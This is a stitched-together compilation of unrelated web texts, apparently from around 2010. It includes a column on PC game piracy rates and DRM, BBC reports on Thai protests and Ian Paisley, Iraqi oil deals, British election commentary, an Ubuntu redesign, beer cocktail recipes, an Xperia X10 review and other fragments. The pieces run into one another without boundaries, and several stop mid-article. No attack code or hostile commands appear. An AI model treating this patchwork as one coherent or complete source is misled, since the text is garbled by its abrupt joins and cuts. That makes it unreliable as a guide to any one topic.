That might be a nice change for me , since I 'd have my weekly column halfway written by the time I finished typing the title .
But one conversation leads to another , which is how we ended up here .
These articles on DRM , piracy , and DLC have led to numerous conversations about business , economics , consumer rights , torrents , and a bunch of other peripheral issues .
What 's always been frustrating is that we 're always grasping for information on which to build some sort of opinion .
Piracy leads to DRM which leads to stupid and annoying hassles .
Is it worth it ?
Does it help ?
Does it make sense for the publisher ?
Would making it more annoying make games more profitable , or less ?
These are questions that might go through your mind while you 're sitting at the installation screen and waiting for the activation servers tell you you 're allowed to play the game you just bought .
On one side the publishers are almost always tight - lipped about the subject .
( Except to say that it's RUINING THEM !!!!)
And on the other end , it 's not like we can tell a great deal about the underground , formless , peer - based , anonymous world of piracy .
But after a few years I think there are gems of wisdom we can sift out .
I 'm not offering hard answers , but I think what I offer here is more useful than the random guesses we 've been using up until now .
How rampant is piracy ?
In 2008 , Reflexive looked at the people who submitted high scores for Ricochet Infinity and found that 92 % of all players were using pirated copies of the game .
Also that year 2DBoy reported 90 % piracy on World of Goo. Last year developer Beautiful Game Studios ' claimed that Championship Manager was the victim of a 90 % piracy rate .
During the week the Demigod was released , publisher Stardock found that 85 % of all players looking for a game were pirates .
All of these are PC titles .
It 's very interesting how close all of these numbers are , despite the diversity of the games themselves .
Casual and hardcore .
Esoteric and mainstream .
Indie and big - budget .
DRM and DRM - free .
Newly - launched titles and and games which have been been out for a year .
All of them are from different companies .
Yet the piracy numbers are within a few percentage points of each other .
I think that , unless we 're going to imagine that all of these disparate parties are somehow forming this conspiracy to over - hype the effects of piracy , we can be very confident that the 90 % figure is a pretty reliable number .
How many people own the game but pirate it to bypass the DRM ?
I do n't actually like to call these people " pirates " .
If you own a game then I do n't think it 's possible to " pirate " it in a moral sense .
If the DRM is giving you problems , then getting a DRM - free version is arguably self - defense .
But in any case , these people can't make up a large part of pirate crew .
Even if every single person who bought the game also downloaded it , then that would still only account for one in nine of all pirates .
How many people use the pirated version as an extended demo ?
Assuming someone tries a game and then goes out and buys it , they are basically indistinguishable from the previous group who buys it and then " pirates " it .
They 're just doing it in a different order .
In any case , these two groups combined simply can't account for more than one in nine downloads .
However , if you 're willing to entertain an anecdote ( which is the only thing we have to work with in a situation like this where nobody will show their cards to anyone else ) then the story of iPhone game Tap - Fu is fairly instructive .
The creators tracked both pirates and customers as they submitted high scores .
They even kept track of how many people ( as identified by their device ) played as a pirate and then later as a legit customer .
The result :
Not one .
Ever .
Remember that the plural of " anecdote " is not " data " .
One case does n't describe the industry in general .
Also remember : None !

Advertisement Thai Prime Minister Abhisit Vejjajiva has rejected a demand from protesters to resign and call elections .
He spoke on national TV as tens of thousands of demonstrators gathered outside the barracks where he is based .
The rally , led by red-shirted supporters of ousted PM Thaksin Shinawatra , was one of the largest in recent years .
It passed off peacefully , but two soldiers were hurt when grenades exploded inside another army base .
An army spokesman said the grenades appeared to have been fired into the compound , but said it was not clear who was responsible .
AT THE SCENE Rachel Harvey , BBC News , Bangkok
With the government appearing determined to resist their demands , the red - shirts decided to up the stakes .
Tens of thousands of demonstrators thronged the streets while loudspeakers mounted on trucks delivered a high - decibel repetition of their demand for fresh elections .
A line of soldiers in riot gear faced them from inside the iron fence of the army compound , but the mood was once again good - natured .
As the day wore on , the army used its own loudspeakers to broadcast jazz tunes composed by the Thai king .
The security forces seem to have decided to wait it out in the hope the protests eventually run out of steam , but as night fell the protesters had regrouped in the old part of Bangkok , in no mood yet it seems to give up .
In Thaksin's ' red - shirted ' country Early in the day , crowds of demonstrators gathered outside the headquarters of the 11th Infantry Battalion barracks in the north of the Thai capital .
Several thousand extra soldiers were sent to reinforce security at the barracks - to which the prime minister had moved after the demonstrators set up camp around Government House .
As the protesters ' deadline for him to step down passed , Mr Abhisit appeared on national television flanked by ministers and coalition allies .
" The protesters have demanded that I dissolve the house before midday ( 0500 GMT ) today , but the coalition parties agree the demand cannot be met , " he said .
" Elections must be held under common rules and genuine calm .
We have to listen to other people 's voices , not just the protesters . "
Mr Abhisit then left the army base by helicopter , saying he wanted to inspect the traffic .
The BBC's Rachel Harvey , who was outside the barracks , says it is not clear where he is now .
FROM GLOBAL VOICES
To me , the most interesting thing to observe were the ordinary Thais - vendors , people coming out of their shops , and people streaming from smaller sub - sois [ streets ] to watch - who were not wearing red , but were cheering as well

The protest passed off in a peaceful and good - humoured manner , our reporter adds , but there was no sign of compromise from either side .
The protesters have now returned from the barracks to their base camp at Government House .
Red - shirt leaders said they would meet to discuss their next move .
One protest leader said the demonstrators would each contribute a small amount of blood to be thrown on the gates of Government House on Tuesday , as a symbol of their determination .
Thaksin legacy About 100,000 demonstrators held rallies in Bangkok on Sunday .

Profile : Thailand 's reds and yellows Q&A : Thailand protests
In pictures : Bangkok protests Political speeches culminated in a video address by Mr Thaksin , who told the crowd they were bringing democracy to Thailand .
Mr Thaksin is living in self - imposed overseas exile after receiving a two - year sentence in absentia for abuse of power ; his supporters say that case was politically motivated .
The protesters say the present government was installed illegally after Mr Thaksin was ousted in a military coup in 2006 , and two subsequent allied governments were deposed by court action .
The red - shirt protest leaders insist their movement is non-violent .
They say they are prepared to stay in the capital for five days , to pressure the government into calling new elections .
The military has been given extra powers to impose curfews and restrict numbers at gatherings if necessary .
The last major protests , in April 2009 , turned violent , with two deaths and dozens of people injured .

DUBAI , U.A.E. —
The two outside interests with the most at stake in Iraq ’s parliamentary election on Sunday are the U.S. military and the major international oil companies .
Both are hoping the vote will yield a decisive result and produce a reasonably strong government , allowing American troops to exit and the oil companies to enter .
Read more on the Iraq election .
Iraqi Prime Minister Nouri al - Maliki , who is trying to win a second term , has made both the troop withdrawal and the revitalization of the oil sector the centerpiece of his campaign .
In recent weeks , Maliki and his oil minister , Hussain al - Shahristani , have signed a flurry of spectacular deals with the international oil companies that should enable Iraq to recover its place among the world ’s major oil producers — and perhaps even challenge Saudi Arabia for the top spot by the end of the decade .
But some of Maliki ’s Shiite rivals in the election , including followers of the radical cleric Moqtada al - Sadr , have denounced the deals with the foreign companies , leaving the companies to wonder what happens to their contracts if Maliki loses .
Iraq now produces about 2.4 million barrels a day and ranks 14th in global production .
But if the oil companies “ are reasonably successful in delivering on the commitments we ’ve made , it is quite likely we will see Iraq increase its production to around 10 million barrels per day within about 10 years , ” Tony Hayward , chief executive of BP , told the World Economic Forum in Davos , Switzerland , earlier this year .
Saudi Arabia ’s production of 10.7 million barrels a day in 2008 , declined slightly last year , but with 266 billion barrels in proven reserves , the Saudis have more oil than anybody .
Iraq ranks fourth , behind Canada and Iran , with 115 billion barrels in proven reserves , but this figure dates from the 1970s and most industry experts believe that , with new technology , there is a lot more oil to be found and that it will be relatively easy to bring online .
The deals that Iraq signed with the major oil companies are long - term service contracts that will pay the companies a fee , generally ranging from a dollar or two per barrel , for each barrel they produce above an agreed minimum .
“ The deal which was reached is major benchmark for the Maliki government .
It is the one ‘ ace in the hole ’ many of the Iraqi people believe they have , ” said Thomas Donovan , an attorney with the Iraq Law Alliance who has followed the process closely .
Shahristani , the oil minister , is generally credited with driving a hard bargain in his dealings with the oil companies .
At least that ’s the prevailing view among oil industry experts , but it is a view not universally shared by the Iraqi people , especially in the midst of a heated election campaign .
Iraq is in dire need of oil revenues and it has no way of rebuilding its devastated oil sector on its own .
But the notion of handing control of the nation ’s oil resources to foreign companies is something that “ runs against the grain ” of many Iraqis , warned Tariq Shafiq in a recent essay published in The Iraq Oil Report .
Shafiq was a founding director of the Iraq National Oil Co. , which controlled the country ’s oil resources from 1966 until it was scrapped by Saddam Hussein a decade ago .
Even if Maliki wins the election , the applecart could still be upset by a lawsuit that is now wending its way through the Iraqi courts .
The suit , brought by a member of parliament , challenges the authority of Maliki and Shahristani to unilaterally negotiate the contracts .
Under Iraq ’s Baath - era oil law , which still stands , the contracts need parliamentary approval .
Donovan , the lawyer , said the legal process , thus far , has been an encouraging sign that the rule of law is taking root in Iraq .
The government is responding to the challenge with briefs and counter - arguments rather than “ violence and retribution , ” he said .
The oil companies are following the case closely , but have not yet filed any briefs in the case .
“ They may be involved in the appeal regardless of the decision , ” Donovan said .
“ They are all playing their cards very close to their chest . ”
Another lingering concern is the dispute over control of reserves in the semiautonomous Kurdish region .
The Maliki government has refused to recognize the contracts signed by more than two dozen foreign oil companies with the Kurdistan Regional Government .
Although the U.S. government does not like to mix guns and oil , the two are inextricably linked in Sunday ’s vote .
If Iraq is deemed safe and stable enough for foreign oil companies to start operations in Iraq , it is likely that the Obama administration will be able to keep its promise to withdraw all combat troops by the end of August .
Current planning calls for about 50,000 troops to remain in Iraq after the deadline as non-combat advisors and trainers and to help with civilian projects .
They are expected to stay through 2011 .
U.S. troops have played a role in restoring a semblance of order to Iraq , but it is the prospect of finally cashing in on the vast wealth beneath Iraq ’s soil that is perhaps the strongest incentive for the Iraqi people to set aside sectarian grievances and unite behind their elected government .

I will not attempt to define all these terms , since no English words could do any of them justice .
The exact meaning of each one is undefinable , and there probably is n't an exact meaning anyway , since some of these even differ among people .
Similarly , I 've included a lot of words that could be considered synonyms ; the connotations of each term , however , are slightly different , and some people may identify with one and not another .
Although I really wanted the words to stand for themselves , without tainting them by splitting them up , with 947 options that 's not really plausible .
So I have categorized them into groups .
Like any other classification system , this is completely arbitrary .
You can still view one long list if you like , or you can view the terms in categories .

UPDATE : Thanks to sil3nttt3 mplar , it appears that playing Halo 2 on LIVE in the past is enough to get you an e-mail , at least in his case .
We ’ll go out on a limb and say that ’s a lot of Halo fans who are going to be covered if that extends further .
Just as the Halo : Reach hype machine cranks up another notch following the release of the Halo : Reach beta multiplayer trailer earlier this week , it transpires that if you are an original Xbox owner you might not need a copy of Halo 3 : ODST to join in on May 3rd after all .
Credit for this should go to the fine folks over at Halo .
Bungie .
Org who received an e-mail this morning regarding the discontinuation of Xbox LIVE on the original Xbox , due to take place on April 15th .
As well as an extra three months on their Gold membership and 400 Microsoft points , it seems like some subset of original Xbox Live members will be e-mailed an invite to the Reach beta as a thankyou .
Up until now , both Microsoft and Bungie have been steadfast in asserting that the Halo 3 : ODST disc is the only way in .
As HBO point out , it ’s unlikely that anybody will be able to do anything now if they are n’t eligible for this already .
Personally speaking , I thought the ODST only restriction would eventually yield in place of some form of hype building code give - aways and the like anyway so it could be things are starting to unravel in this regard as the beta draws closer .
If we get any more information , we ’ll update this post .
Stay tuned .
Long - Term Capital Management ( LTCM ) had mythic status as a bond trader in the 1990s .
It had a supposedly unbeatable formula for calculating risk - an algorithm based on past market performance .
But on 17 August 1998 , Russia unexpectedly defaulted on its sovereign debt .
LTCM lost $ 4.6bn and folded shortly thereafter .
The fund chiefs had committed an elementary error .
The data they fed into their formula went back only a few years , a period that happened to cover stable , rising markets .
They had mistaken what was recent for what was normal .
What does this parable of hedge - fund hubris have to do with British politics ?
For one thing , it is worth keeping in mind whenever market opinion is cited in connection with the election .
Traders do not have supernatural powers of perception .
They have short memories and are terrible at measuring political risk .
Yet this campaign , more than any before , will be conducted in deference to financial indices .
That is because the next parliament will have to oversee a process of fiscal tightening - tax rises and spending cuts .
As politicians are n't always in a hurry to inflict that sort of pain , there is an incentive for everyone to see markets as the force majeure , demanding austerity as the price of servicing British debt .
First cut is the deepest
The Tories have a particular need to talk up the exigences of the market .
They want to cut deeper and earlier than Labour - but that approach is n't selling well on the doorstep .
People hear " cuts " and imagine nurses being herded to the guillotine .
So if people are n't seduced by austerity , they have to be scared by bankruptcy .
The market gods are displeased , the tribal Tory drums will beat ; they demand blood sacrifice .
George Osborne recently claimed that if Gordon Brown were re-elected , international investors would be " heading for the exits " .
That is questionable .
It is , however , clear that investors would prefer a decisive victory for one side or the other .
" In the event of a hung parliament , " a note from the Japanese financial services group Nomura said this week , " we believe that the inevitable uncertainty over the shape and sustainability of the next government would be such that markets would see it as a negative . "
In other words , sell Cleggs .
Markets see a hung parliament as something negative because on paper it sounds like a situation in which the country has no government .
Besides , the last time an election produced one was February 1974 , when most of the people now passing judgement on the viability of UK gilts were n't even trading football stickers in the playground .
But you do n't need a hung parliament to have legislative deadlock .
In 1992 , John Major was elected with a majority of 21 .
Rebellions , defections and by - elections left him barely able to govern .
By coincidence , the forces that produced both of the last two bouts of administrative paralysis in British politics - industrial action in the 1970s and swivel - eyed Europhobia in the 1990s - are poised for a comeback .
The raw political aggression that has recently been on display over British Airways 's dispute with the Unite union is not just electioneering ; it is a harbinger .
BA is unusual in the private sector for the power wielded by its unionised workforce .
Most companies have been free to inflict whatever cost - cutting measures the recession has demanded without fear of their workers walking out .
Most public - sector bodies , however , have n't even started that process .
After the election , they will have to start implementing pay freezes , taking away pension privileges and sacking people .
The Tories could win with a workable majority and find that , while the Commons offers no obstacle to a deficit - reduction plan , thousands of striking public - sector workers marching on Parliament Square are less compliant .
I doubt David Cameron is anxious about crossing a picket line .
But around the time that the Tory leader is getting into a fight with the unions , his Euro - woes will start kicking in .
In opposition , Cameron 's EU policy has been simple .
He opposed the Lisbon Treaty until it came into force , then he sullenly accepted it as a fait accompli and promised to negotiate some symbolic " repatriation " of power from Brussels .
It wo n't happen .
Most other European governments see the ratification of the Lisbon Treaty as a blessed relief , clearing the way for serious continental business .
Tory ministers will soon find themselves having conversations with their EU counterparts - about tax and financial regulation , for example - that their MPs will deem borderline treasonous .
It is possible that Tory backbenchers will be as meek as novice monks and not rebel .
But Cameron 's leadership style has made that unlikely .
The whole " modernisation " project is really a putsch by a small junta : Dave , George and a handful of their closest friends and advisers .
They have not given the rest of the party much love .
" They just do n't make an effort to talk to many people , regardless of their political stripe , " says one disgruntled adviser .
" Even the shadow cabinet feels left out . "
Backbench stabbing
On top of that , Cameron himself has acquired a reputation for aloofness that verges on being plain rude .
Chatter about how he does n't smile at his MPs in the lift , and other such injuries , would n't matter if the Tories were cruising to a comfortable win , but they are n't .
A victory with a slim majority holds a double danger for Cameron .
The backbenchers he has snubbed will have numerical leverage over him .
But they will also assume a reactionary moral high ground .
There are many Tories who have temporarily suspended their mistrust of Cameron in the hope that he will deliver a big win .
If he delivers only a small one , they will consider him exposed as a charlatan .
It is true that a hung parliament might be unstable .
But not much less stable than a parliament with a small Tory majority .
There has been much discussion in recent weeks of the " kingmaker " role that Nick Clegg could assume if no party has an overall majority , but there has n't yet been much attention paid to the " king - wrecker " role that backbench Tory MPs could play .
Their relative obedience in the past few years has been motivated by anticipation of an election victory .
It is no guide to what will happen afterwards .
Remember LTCM .
It is a mistake in politics , as it is in markets , to take what is recent as a guide to what is normal .
Canonical has revealed the style of the new default theme that will be used in Ubuntu 10.04 , the next major version of the popular Linux distribution .
In a significant departure from tradition , Ubuntu is shedding its signature brown color scheme and is adopting a new look with a palette that includes orange and an aubergine shade of purple .
Ubuntu 's distinctive brown look dates back to the very first version of the distribution , which was released in 2004 .
Although the style has evolved considerably since then and new colors like orange gradually gained a foothold in the desktop palette , brown has been the dominant color of Ubuntu 's default themes for the past five years .
Canonical began discussing the possibility of a major visual refresh in 2007 during the development of Ubuntu 8.04 , the last major long - term support release .
At the time , Canonical 's art team was thinking about adopting a darker look with a black and orange color scheme , but the theme concept was abandoned and never implemented .
Although the idea of a major visual refresh was resurrected and discussed again during the development process of several subsequent Ubuntu versions , it has n't happened until now .
The theme change is part of a broader effort to redefine Ubuntu 's visual identity , a move that could help make the open source desktop platform seem more professional and attractive to a mainstream audience .
According to design documentation in the Ubuntu wiki , the new style was developed last year by Ubuntu founder Mark Shuttleworth and a team of designers .
They chose " light " as the thematic concept behind the new brand identity .
The new Ubuntu logo , which was also unveiled today , has a thinner font and a smaller icon .
" We 're drawn to Light because it denotes both warmth and clarity , and intrigued by the idea that ' light ' is a good value in software .
Good software is ' light ' in the sense that it uses your resources efficiently , runs quickly , and can easily be reshaped as needed , " the design documentation says .
" Visually , light is beautiful , light is ethereal , light brings clarity and comfort . "
Another GtK theme
The new logo and colors will be rolled out to the Ubuntu website .
The logo will also be featured in the new boot splash screen for Ubuntu 10.04 .
The updated GNOME theme will include an aubergine desktop and gray widget styling .
The orange " Humanity " icon theme will apparently be retained during this cycle .
Two variants of the GNOME theme are displayed on the Wiki page , one with black menus and panels and another with light menus and panels .
It 's unclear at this time which one will be the new default .
These designs are still at a relatively early stage and will undergo further refinement prior to the official release .
Making Linux beautiful
When Ubuntu founder Mark Shuttleworth gave his memorable keynote at OSCON in 2008 , he articulated a vision of building a Linux desktop with industry - leading design and unbeatable usability .
He promised that Canonical would invest in a broad effort to make Linux beautiful .
" I think the great task ahead of us over the next two years is to lift the experience of the Linux desktop from something that is stable and robust and not so pretty , to something which is art .
Not emulate , but blow right past Apple in the user experience we deliver to our end users , " he said at OSCON in 2008 .
A few months after that speech , Canonical launched the Ayatana project , a broad initiative to improve the usability of Ubuntu and upstream open source software projects including the GNOME desktop .
Canonical assembled a team of professional usability and design experts to take on the task .
Ayatana has delivered tangible results , including an enhanced desktop notification system and a multitude of minor improvements to usability and consistency throughout the desktop .
Although Ubuntu has made great strides in the area of usability , it has still lagged behind other distros like openSUSE in the quality of its theming and visual style .
The new theme is a nice improvement that will move Ubuntu forward and make the desktop more visually appealing .
It 's time for deal of the week , and this time it 's just in time for camping season .
I want you to picture yourself in ...
Ian Paisley to stand down as MP after 40 years
Ian Paisley stepped down as DUP leader in 2008 DUP North Antrim MP Ian Paisley has confirmed he will not be standing in the general election .
Mr Paisley , 83 , has been an MP since 1970 .
It is thought that his son Ian Paisley Jr will face TUV leader Jim Allister in the constituency .
At the last general election in 2005 , Mr Paisley polled 25,156 votes , giving him a majority of nearly 18,000 .
Mr Paisley was widely expected to retire as an MP after stepping down as DUP leader in 2008 .
However , after the anti-powersharing TUV took almost 70,000 votes from the DUP at last year 's European election , Mr Paisley signalled he was considering standing for re-election in North Antrim .
In recent interviews , he had refused to be drawn on whether he would stand again , but confirmed his decision to step down to the Ballymena Guardian on Tuesday .
Mr Paisley told the paper he had " no regrets " about deciding to share power with Sinn Fein in 2007 .
" After a period of tough negotiations it was my view that , provided our conditions were met , the overwhelming majority of the people of Northern Ireland wanted me to do the deal , it was as simple as that , " he said .
Mr Paisley said he was saddened that some DUP members had quit in protest , adding : " I believe I showed the leadership required to get the best possible deal in the circumstances . "
Please turn on JavaScript .
Media requires JavaScript to play .
He first came to international prominence in the late 1960s as a hardliner and political firebrand but mellowed in recent years .
After the DUP and Sinn Fein agreed to share power in 2007 , Mr Paisley formed an unlikely friendship with his former enemy Martin McGuinness of Sinn Fein .
The two men were so close they were dubbed the " Chuckle Brothers " .
On Tuesday , following the announcement , Mr McGuinness said he considered Mr Paisley a personal friend and still contacted him regularly .
He added : " We had the ability to sit down and talk to one another about the way forward and we were agreed on how we should move forward . "
' Significant era ' Mr Paisley , who turns 84 next month , was first elected as a MP in 1970 .
He has in recent years stepped down from senior positions in politics and in his Free Presbyterian Church .
His son , Ian Paisley Jr , said he did not want to pre-empt the DUP 's selection meeting on Monday by saying he expected to be nominated .
In Pictures : Ian Paisley 's career " This is the end of a significant era in British politics and Ian Paisley has left giant footsteps to fill , " he said .
Mr Paisley said his hardline former party colleague Jim Allister , the TUV leader who quit the DUP in protest at its decision to share power with Sinn Fein , was not a good alternative for voters .
" They certainly have a rant , they certainly have a person consumed by their own anger , hypocrisy and conceitedness and a person without a plan , " he said .
" He offers nothing - his strategy is destroy the assembly and go back to direct rule - we had a generation of direct rule and that failed . "
Mr Allister said his former party leader had done a " very good job " in his early years as an MP but in recent times his record was " far from impressive " .
" He 'd only been at 18 % of votes in this parliament and missed key votes like on the referendum on Europe , abortion issues and blasphemy laws and a whole string of issues , " he said .
" Obviously he was n't able to do the job so he 's given up .
" His legacy is of terrorist - inclusive government and I believe North Antrim has n't changed , its people have n't changed and they will once more embrace the tried and tested principles of traditional unionism which they have held on to for so long . "

Retro , a company that makes cycling apparel , has announced their newest product : A pair of jerseys emblazoned with covers from The New Yorker .
The men ’s jersey design comes from a 1929 cover by by Theodore G. Haupt , depicting a bicycle race with a heavy Art Deco gloss .
The women ’s jersey is a newer design , drawn by Ana Juan for a 2008 cover .
According to the press release , it depicts “ a femininity both delicate and strong . ”
Leaving aside how weird these things look , who ’s this for ?
The New Yorker is one of the world ’s great publications .
And serious cycling has partly been co-opted by high - brow weekend warriors capable of laying out $ 7,000 for a bike .
So we suppose the mash up makes sense–if you ’re afraid that your bike only speaks to how much money you make , you could take solace in thinking , “ But I read The New Yorker .
And everyone knows it . ”
So tune up the bike , load - up the iPod with some atonal jazz , pack some brie and compote into a picnic basket–and have a blast , good sir !
( In terms of ideal customer : Frasier comes to mind . )
Retro , for it ’s part , has armed itself with some strange art choices :
They ’ve already secured licenses for Smokey the Bear , The Grinch , The Scream , and Rosie the Riveter .
The New Yorker jerseys will be on sale in June .

The campaign of Democratic presidential candidate Barack Obama quickly put out a statement in response to President Bush ’s lifting of the executive offshore drilling ban .
“ If offshore drilling would provide short - term relief at the pump or a long - term strategy for energy independence , it would be worthy of our consideration , regardless of the risks .
But most experts , even within the Bush Administration , concede it would do neither .
It would merely prolong the failed energy policies we have seen from Washington for thirty years , ” Obama campaign spokesman Bill Burton said .
The campaign also called for real solutions to the energy crisis , “ Senator Obama believes Americans need real short - term relief , which is why he has proposed a second round of stimulus with energy rebates for working families .
And over the long - term , Senator Obama understands that our national security and the survival of the planet demand a real strategy to break our dependence on foreign oil by developing clean , new sources of energy and by vastly improving the energy efficiency of our cars , trucks and our economy .
He is ready to lead such a transformation . ”

Polls show that when voters are asked the generic question , do you support offshore drilling most people say yes .
However , on the rare occasion that a poll actually asks the correct question , which is do you support offshore drilling if it wo n’t help the price of oil for 10 - 15 years ?
Support for the idea declines .
Republicans are trying to pull a bit of a bait and switch on the voters .
They argue that we can solve our energy problems by offshore drilling for oil , but what they leave out is that the oil will belong to the oil companies , not the United States , and that this relief will take over a decade to arrive and will last for 3 years .
The American people do n’t like the fact that they are paying so much for gas , but they do n’t want to drive less .
They are looking for an easy answer .
However , there is no painless solution to this problem .
I do n’t think that Bush , McCain , and the GOP will be able to fool voters through Election Day .
Obama has to keep hammering with the fact that offshore drilling wo n’t solve the problem .

Ingredients
We went to the Cavendish Laboratory to discover how fat you would have to be to stop a bullet .
We used a gas gun , which is basically a huge air rifle .
There is a chamber that is filled with high pressure helium ( this is used because it is lighter than air so will expand more quickly ) .
The gun has a 3 m long barrel which you load a small ball bearing into .
There is a valve between the chamber and the barrel which can be opened very quickly .
The gas ( at about 70 atmospheres ) then expands extremely rapidly forcing the bullet out of the barrel at supersonic speeds .
The gas chamber which is filled by high pressure helium
The bullet - a small steel ball bearing .
A perspex tube was filled with gelatin , which is a similar density to fat , to act as the target .
Refactoring Functional Programs
http://www.cs.kent.ac.uk/projects/refactor-fp/
Refactoring is about `improving the design of existing code ' and as such , it has been practised as long as programs have been written .
The term refactoring specifically refers to a common activity in programming and software maintenance : changing the structure of a program without changing its semantics .
Often , refactoring precedes a program modification or extension , bringing the program into a form better suited for the modification step .
Sometimes , refactoring is of anticipatory nature -- bringing a program into a nice shape after making it work , in the hope to facilitate reuse and maintenance .
There are obvious relations to the general issues of reengineering old systems for new purposes , but the key point is to separate changes to how the program is organised ( refactoring ) from changes to what the program does .
Refactoring was first identified as an activity in its own right within the object - oriented programming and software engineering communities , and it has become popular there in the form of catalogues documenting sequences of refactoring steps and tool support for carrying out refactorings ( see www.refactoring.com).
The aim of our research is bring the advantages of refactoring to functional programmers , with a specific focus on support for Haskell programmers .
This focus serves to keep our work concrete and practical , not to exclude other functional languages .
We will be complementing our work with an EPSRC - supported project to investigate refactoring of Erlang programs , starting summer 2005 .
We are also very keen to recruit PhD students in refactoring and functional programming ; a number of concrete project suggestions can be found here .
Please get in touch with us if you would be interested to become part of our functional programming group

Think of this as closing the loop from yesterday .
After we broke national news yesterday with another mystery billboard here in Minnesota criticizing Barack Obama by comparing him to his predecessors — in this case , Ronald Reagan — some felt that the picture was in some way photoshopped .
That belief persisted even after other news agencies confirmed with Franklin Outdoor Advertising that the sign existed exactly as we reported , on I - 94 outside of Albertville on the northwest end of the Minneapolis - St.
Paul metro area .
Hot Air reader and commenter Bishop conducted his own photojournalistic expedition this morning — and as readers can see , he had to deal with weather that was hardly conducive to the effort .
Here are a few more shots of the Reagan Billboard taken today , which will hopefully put to rest any questions of authenticity :
Bishop also took video of the billboard :
That should settle any questions of authenticity .

I think we can all agree that beer is a constant delight , a wonderful beverage that need not yield to any in its excellence .
Yet whenever mixed drinks rise in their relative popularity , the phrase " beer cocktail " gets kicked around and people suggest topping off your mojito with Coors , mashing chunks of watermelon into your Fat Tire , or other such silliness .
That 's not to say you can't mix beer .
People have been doing that ever since there was beer to mix .
A few cocktail experts have even succeeded in working the stuff into honest - to - God cocktails , although they 're usually not using the kind of beer you can find at the local Kwik - E - Mart .
The beer drinks that have stood the test of time tend to be simple , ungimmicky things : beer , an extra ingredient or two , and done .
We 've mentioned a couple of these over the years the Cincinnati Cocktail ( beer and seltzer ; very refreshing ) , the sublime Michelada ( beer , lime , hot sauce , seasoning ) but have by no means exhausted the category .
Here are four more , each combining the quaffing pleasure of a beer with some of that element of surprise you get from a cocktail .
Plus , we 've tacked on an extra one of our own , just for fun .
Porteree
Ancient , rich , sweet , rewarding , and simple .
Fill a pint glass ¼ of the way with chilled porter .
( We generally use Anchor or Geary 's . )
Stir in 1 tsp superfine sugar or , better , 1 tsp demerara sugar syrup ( made with 2 parts raw sugar to 1 part water , heated and stirred until sugar has dissolved ) and fill glass with cracked ice .
Slowly top off with more porter until full .
Grate nutmeg over the top .
Black Velvet
A classic .
The most elegant and delicious of beer drinks .
Fill a champagne flute halfway with chilled stout .
( Guinness is effective , but if you can get Brooklyn Black Ops , you 'll be in a whole other world . )
Top off slowly with chilled brut champagne ; this is a good use for that bottle of Veuve Clicquot you 've been meaning to drink .
Shandy Gaff
This one goes back to the 19th century .
It was light , spicy , and refreshing then and it still is now .
Fill a pint glass a little more than halfway with a good American pale ale ( we like Mendocino Red Tail Ale ) , well chilled .
Top off slowly with ginger beer , the spicier the better .
Berliner Weisse mit Schuss
Berlin 's traditional wheat beer is drunk with a schuss , or shot , of either green waldmeister syrup ( germandeli.com ) or red-raspberry syrup in it .
Most pleasant .
Pour a 1 oz schuss of waldmeister or raspberry syrup into a large wheat - beer glass .
Slowly add 16 oz cold Berliner Kindl Weisse or other light German - style wheat beer .
Groundskeeper
When we were putting this article together , a question came up :
What do you do with , say , Budweiser ?
What about a superpeaty Scotch , the kind that 's almost too smoky to drink ?
Bingo .
The Scotch calms down ; the Bud mans up .
Pour 1 oz ultrasmoky single - malt Scotch , such as Ardbeg or Laphroaig , into a pint glass .
Add 12 oz chilled Bud or other American pilsner .

The Android 2.1 update has n't made this into a contender , and Sony Ericsson has missed a chance to make the X10 into a real powerhouse .
UPDATE : We 've now got our hands on a Sony Ericsson Xperia X10 complete with the Android 2.1 update - lets see if it's any better or whether it 's pushed SE further behind the Android pack .
After a disappointing 2009 for Sony Ericsson , with the likes of the Satio failing to live up to its flagship billing , the Swedish - Japanese alliance is back with its first Android proposition - the Sony Ericsson Xperia X10 .
It 's got all the makings of a true classic - a whopping 4 - inch screen , a 1GHz Snapdragon processor and it's rocking Android with a cool overlay .
In short , since we first heard about it at the tail end of 2009 , we 've been excited to see if it can be the handset to return Sony Ericsson to the sharp end of the mobile phone game .
It 's odd , but given the massive screen on the phone , the first thing you notice when looking at the Xperia X10 is not the screen - on our black review model the main thing is simply how shiny it is .
It 's an understated phone , with a sharp , angular design and minimal buttons - in short , it looks like the kind of high - end handset we 'd expect from one of the leading mobile manufacturers .
The screen dominates most of the front of the Xperia X10 , and there are three buttons at the bottom , denoted as menu , home and back .
( Albeit with some indecipherable symbols - what 's wrong with actually writing ' Menu ' and ' Home ' on there ? )
Between each of the front buttons there 's a little LED , which glows brightly whenever the phone is used - a nice touch that adds a premium feel , although they can get a little annoying , especially in the dark - and it seems there 's no way to turn them off .
The rest of the phone is pretty sparse - compared to the likes of the Sony Ericsson Satio and Vivaz , it 's a little odd to only see a single camera shutter button on the right - hand side of the phone , with the volume up / down key above it at the other end .
On the top of the phone , there 's the 3.5 mm headphone jack , flush to the chassis , and the on / off button , which doubles as the lock key too .
It 's a little far away from where you usually rest your hand , so you 'll generally find yourself using your other hand to activate it - which is a little irritating .
The microUSB slot is located at the top as well under a dust cap - this is a little awkward to get off at times , and has a frustratingly short leash to keep it in place - meaning you have to really wedge it out of the way to connect up the charger .
There 's nothing at all on the left - hand side of the Xperia X10 , nor on the bottom , save a little grille to attach a lanyard if you 're one of those that sees a big mobile as an ideal replacement for a necklace .
The back of the phone is slightly curved - we assume this is another corollary of the ergonomics study conducted by Sony Ericsson which led to the ' human curvature ' of the Sony Ericsson Vivaz .
It does make it slightly nicer to hold in the hand admittedly - but it adds a lot of thickness to the device , which is 13 mm .
When you consider the HTC HD2 , which has a much larger 4.3 - inch screen , is a couple of millimetres thinner at 11 mm , it does make something of a difference with a device this size .
Overall though , it 's not the worst looking phone in the world by a long way - it certainly does n't overpower your hand when you 're holding it , and the screen looks lovely and bright in use , without being dominated by the chassis .
In the box
Sony Ericsson usually chucks in everything it can find into the boxes of its phones , but with the Xperia X10 things are a little more minimalist .
Like HTC and Apple , the box for the X10 is coffin - like , with only basic cables inside .
The environmentally friendly idea of offering a microUSB cable with plug adaptor saves on needing an extra charger , but does get irritating when you keep having to go off and find the lead when transferring content .
Of course , it 's probably easier to just perform the latter task by just connecting a memory card and transferring content that way - especially when you get an 8 GB card in the box and Android is set up to connect up to your PC and easily copy content across .
THE PARTIES ARE SUPPOSED TO DISAGREE ….
I ’ve never held House Minority Leader John Boehner ( R - Ohio ) in high regard .
But I could n’t agree more with something he said this morning .
Despite White House overtures for congressional Republicans to work with Democrats , the top GOP official in the House said Sunday that such opportunities are limited .
